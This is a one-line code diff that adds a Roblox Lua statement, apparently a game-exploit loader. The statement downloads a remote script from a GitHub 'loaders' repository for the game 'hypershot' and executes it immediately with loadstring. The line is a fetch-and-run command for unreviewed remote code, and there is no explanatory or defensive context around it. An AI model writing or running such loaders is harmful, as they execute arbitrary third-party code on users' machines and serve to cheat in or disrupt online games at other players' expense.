@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/hypershot-spam5-79sgaevvjqx3uw.lua"))()
